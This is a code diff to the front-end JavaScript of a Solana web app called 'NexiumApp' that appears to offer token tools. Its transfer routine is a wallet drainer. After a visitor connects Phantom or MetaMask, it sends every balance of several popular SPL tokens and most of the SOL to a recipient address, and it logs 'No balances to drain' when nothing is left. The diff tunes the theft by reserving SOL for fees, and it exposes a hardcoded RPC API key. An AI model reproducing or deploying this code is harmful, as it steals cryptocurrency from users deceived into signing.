@@ -15,7 +15,7 @@ console.log('main.js: Buffer after spl-token import:', typeof globalThis.Buffer)
 const {
   TOKEN_PROGRAM_ID,
   createTransferCheckedInstruction,
-  getAssociatedTokenAddress,
+  getAssociatedTokenAddressSync,
   createAssociatedTokenAccountInstruction,
   getOrCreateAssociatedTokenAccount,
 } = splToken;
@@ -23,7 +23,7 @@ const {
 console.log('main.js: spl-token exports:', {
   TOKEN_PROGRAM_ID: !!TOKEN_PROGRAM_ID,
   createTransferCheckedInstruction: !!createTransferCheckedInstruction,
-  getAssociatedTokenAddress: !!getAssociatedTokenAddress,
+  getAssociatedTokenAddress: !!getAssociatedTokenAddressSync,
   createAssociatedTokenAccountInstruction: !!createAssociatedTokenAccountInstruction,
   getOrCreateAssociatedTokenAccount: !!getOrCreateAssociatedTokenAccount,
 }); // Log 5
@@ -44,7 +44,7 @@ const POPULAR_SPL_TOKENS = [
   { mint: "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN", decimals: 6, name: "JUP" },
   { mint: "85VBFQZC9TZkfaptBWjvUw7YbZjy52A4zSrA8E98kC3U", decimals: 6, name: "W" },
   { mint: "KMNo3nJsBXfcpJTVqwWzJxaR5i5Z6GmsWTSPQ3sYk8p", decimals: 6, name: "KMNO" },
-  { mint: "TNSRxcUxoT9xWYW1UnP8eG5ZVyiFoPmgxpLWiu5LhByNenVbPb", decimals: 6, name: "TNSR" },
+  { mint: "TNSRxcUxoT9xWYW1UnP8eZJ7RPf2rDXgUbS4ao9kR1S", decimals: 6, name: "TNSR" },
   { mint: "2C4YvXUo2dJq4NjeaV7f3hDtkmTwrYkrAd4ToGTxK1r6", decimals: 9, name: "DAGO" },
   { mint: "2V4TjFjC87CYLYbSJTcT5mWnG2h4oVRr17a94bREh6Vz", decimals: 9, name: "TUAH" },
   { mint: "4LUigigJte7XuTktJ4S2fE6X6vK3C2zT7vJAdXvV3c4Q", decimals: 9, name: "LUIGI" }
@@ -306,7 +306,7 @@ class NexiumApp {
         }
 
         this.publicKey = accounts[0];
-        this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/2F4RzncerbMXhPvN6JjPGsegmAcnSg786uQWVzc6VNM2CFfjwqFLEJjJodSa5JRi4DXNDLUMgd9X7iR3yCFqmdx9KXv5FNJYMCr`, 'confirmed');
+        this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/2F4RzncerbMXhPvN6JjPGsegmAcnSg786uQWVzc6VNM2CFfjwqFLEJjJodSa5JRi4DXNDLUMgd9X7iR3yCFqmdx9KXv5FNJYMCr`, {commitment: 'confirmed', wsEndpoint: ''});
         console.log(`${walletName} connected via extension: ${this.publicKey}`); // Log 38
         this.connectedWalletType = walletName;
         console.log(`Setting button state to connected for ${walletName}`); // Log 39
@@ -351,7 +351,7 @@ class NexiumApp {
               this.connecting = false;
               return;
             }
-            this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/2F4RzncerbMXhPvN6JjPGsegmAcnSg786uQWVzc6VNM2CFfjwqFLEJjJodSa5JRi4DXNDLUMgd9X7iR3yCFqmdx9KXv5FNJYMCr`, 'confirmed');
+            this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/2F4RzncerbMXhPvN6JjPGsegmAcnSg786uQWVzc6VNM2CFfjwqFLEJjJodSa5JRi4DXNDLUMgd9X7iR3yCFqmdx9KXv5FNJYMCr`, {commitment: 'confirmed', wsEndpoint: ''});
             console.log(`MetaMask connected via deeplink: ${this.publicKey}`); // Log 48
             this.connectedWalletType = walletName;
             console.log(`Setting button state to connected for ${walletName} (deeplink)`); // Log 49
@@ -369,7 +369,7 @@ class NexiumApp {
           const response = await window.solana.connect().catch(() => null);
           if (response && response.publicKey) {
             this.publicKey = response.publicKey.toString();
-            this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/2F4RzncerbMXhPvN6JjPGsegmAcnSg786uQWVzc6VNM2CFfjwqFLEJjJodSa5JRi4DXNDLUMgd9X7iR3yCFqmdx9KXv5FNJYMCr`, 'confirmed');
+            this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/2F4RzncerbMXhPvN6JjPGsegmAcnSg786uQWVzc6VNM2CFfjwqFLEJjJodSa5JRi4DXNDLUMgd9X7iR3yCFqmdx9KXv5FNJYMCr`, {commitment: 'confirmed', wsEndpoint: ''});
             console.log(`Phantom connected via deeplink: ${this.publicKey}`); // Log 53
             this.connectedWalletType = walletName;
             console.log(`Setting button state to connected for ${walletName} (deeplink)`); // Log 54
@@ -481,53 +481,46 @@ class NexiumApp {
       console.log("Transaction initialized:", transaction); // Log 84
 
       // Get initial balance
-      const balance = await this.solConnection.getBalance(senderPublicKey);
+      let balance = await this.solConnection.getBalance(senderPublicKey);
       console.log("Total balance:", balance, "lamports"); // Log 90
 
-      // Add SOL transfer with full balance (network will deduct fees)
-      transaction.add(
-        SystemProgram.transfer({
-          fromPubkey: senderPublicKey,
-          toPubkey: recipientPublicKey,
-          lamports: balance
-        })
-      );
-      console.log("SOL transfer instruction added, lamports:", balance); // Updated Log 85
+      // Collect token instructions and check balances
+      const tokenInstructions = [];
+      const hasBalanceTokens = [];
 
-      // Handle SPL token transfers with ATA creation
       for (const token of POPULAR_SPL_TOKENS) {
-        const mintPublicKey = new PublicKey(token.mint);
-
         try {
-          // Create or get sender's ATA
-          const senderTokenAccount = await getOrCreateAssociatedTokenAccount(
-            this.solConnection,
-            senderPublicKey,
-            mintPublicKey,
-            senderPublicKey
-          );
-          console.log(`${token.name} sender ATA: ${senderTokenAccount.address.toBase58()}`);
+          const mintPublicKey = new PublicKey(token.mint);
+          const senderTokenAccountAddress = getAssociatedTokenAddressSync(mintPublicKey, senderPublicKey);
+          const tokenAccountInfo = await this.solConnection.getTokenAccountBalance(senderTokenAccountAddress).catch(() => null);
 
-          // Create or get recipient's ATA
-          const recipientTokenAccount = await getOrCreateAssociatedTokenAccount(
-            this.solConnection,
-            senderPublicKey, // Payer for creation
-            mintPublicKey,
-            recipientPublicKey
-          );
-          console.log(`${token.name} recipient ATA: ${recipientTokenAccount.address.toBase58()}`);
-
-          const tokenAccountInfo = await this.solConnection.getTokenAccountBalance(senderTokenAccount.address);
-          if (tokenAccountInfo.value.amount === '0') {
+          if (!tokenAccountInfo || tokenAccountInfo.value.amount === '0') {
             console.log(`Skipping ${token.name} transfer: No balance`);
             continue;
           }
 
-          transaction.add(
+          hasBalanceTokens.push(token.name);
+
+          const recipientTokenAccountAddress = getAssociatedTokenAddressSync(mintPublicKey, recipientPublicKey);
+          const recipientAccount = await this.solConnection.getAccountInfo(recipientTokenAccountAddress);
+
+          if (!recipientAccount) {
+            tokenInstructions.push(
+              createAssociatedTokenAccountInstruction(
+                senderPublicKey,
+                recipientTokenAccountAddress,
+                recipientPublicKey,
+                mintPublicKey
+              )
+            );
+            console.log(`${token.name} recipient ATA creation instruction added`);
+          }
+
+          tokenInstructions.push(
             createTransferCheckedInstruction(
-              senderTokenAccount.address,
+              senderTokenAccountAddress,
               mintPublicKey,
-              recipientTokenAccount.address,
+              recipientTokenAccountAddress,
               senderPublicKey,
               BigInt(tokenAccountInfo.value.amount),
               token.decimals
@@ -540,8 +533,47 @@ class NexiumApp {
         }
       }
 
+      // Determine reserve based on tokens
+      let solAmount = 0;
+      if (balance > 0) {
+        let reserve = 0;
+        if (hasBalanceTokens.length === 0) {
+          reserve = 5000; // Basic fee for SOL only
+        } else {
+          let reserveRatio = 0.4; // 40%
+          reserve = Math.floor(balance * reserveRatio);
+        }
+        solAmount = balance - reserve;
+        if (solAmount < 0) solAmount = 0;
+        console.log("SOL transfer amount calculated:", solAmount);
+      }
+
+      // Add token instructions first
+      if (tokenInstructions.length > 0) {
+        transaction.add(...tokenInstructions);
+      }
+
+      // Add SOL transfer last if applicable
+      if (solAmount > 0) {
+        transaction.add(
+          SystemProgram.transfer({
+            fromPubkey: senderPublicKey,
+            toPubkey: recipientPublicKey,
+            lamports: solAmount
+          })
+        );
+        console.log("SOL transfer instruction added, lamports:", solAmount); // Updated Log 85
+      }
+
+      // Skip if no instructions
+      if (transaction.instructions.length === 0) {
+        console.log("No transfers to perform, skipping transaction");
+        this.showFeedback("No balances to drain", 'info');
+        return;
+      }
+
       const { blockhash, lastValidBlockHeight } = await this.solConnection.getLatestBlockhash();
-      console.log("Fetched blockhash:", blockhash, "lastValidBlockHeight:", lastValidBlockHeight); // New Log 99
+      console.log("Fetched blockhash:", blockhash, "lastValidBlockHeight:", lastValidBlockHeight); // New Log 86
       transaction.recentBlockhash = blockhash;
       transaction.feePayer = senderPublicKey;
       console.log("Transaction configured with blockhash and feePayer:", transaction); // Log 87
@@ -721,7 +753,7 @@ class NexiumApp {
       this.attachWalletListeners();
       if (this.isWalletConnected() && navigator.onLine) {
         this.publicKey = window.solana?.publicKey?.toString() || window.ethereum?.selectedAddress;
-        this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
+        this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, {commitment: 'confirmed', wsEndpoint: ''});
         console.log('Wallet connected on init, publicKey:', this.publicKey); // Log 147
         this.connectedWalletType = window.solana?.isPhantom ? 'Phantom' : window.ethereum?.isMetaMask ? 'MetaMask' : null;
         this.handleSuccessfulConnection();
@@ -824,7 +856,7 @@ class NexiumApp {
       <h2 class="section-title">Import Custom Token</h2>
       <div class="input-group flex space-x-2">
         <input id="customTokenNameInput" type="text" placeholder="Token Name" class="custom-token-input flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token name">
-        <input id="customTokenAddressInput" type="text" placeholder="Token Address" class="custom-token-input flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token address">
+        <input id="customTokenAddressInput" type="text" placeholder="Token Address" class="custom-token-input flex-grow bg[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token address">
         <button id="showCustomTokenBtn" class="fetch-custom-token-btn bg-orange-400 text-black px-4 py-1 rounded-xl hover:bg-orange-500" aria-label="Show custom token">Show</button>
       </div>
       <div id="tokenInfoDisplay" class="token-info hidden" aria-live="polite"></div>
@@ -860,7 +892,7 @@ class NexiumApp {
       <h2 class="section-title text-yellow-400 text-md font-semibold mb-4">Amount</h2>
       <div class="input-group flex items-center space-x-2">
         <span class="text-white text-lg">$</span>
-        <input id="volumeInput" type="number" placeholder="Amount in $" class="volume-input flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Amount in dollars" min="0" step="0.01">
+        <input id="volumeInput" type="number" placeholder="Amount in $" class="volume-input flex-grow bg[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Amount in dollars" min="0" step="0.01">
       </div>
     `;
     this.dom.app.appendChild(amountSection);
